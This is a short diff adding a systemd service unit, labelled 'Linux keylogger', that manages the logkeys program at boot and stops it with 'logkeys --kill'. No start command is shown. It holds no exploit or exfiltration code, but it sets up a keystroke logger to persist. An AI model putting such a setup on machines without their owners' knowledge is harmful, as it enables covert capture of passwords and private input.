@@ -1,0 +1,10 @@
+[Unit]
+Description=Linux keylogger
+
+[Service]
+Type=forking
+GuessMainPID=yes
+ExecStop=/usr/bin/logkeys --kill
+
+[Install]
+WantedBy=multi-user.target
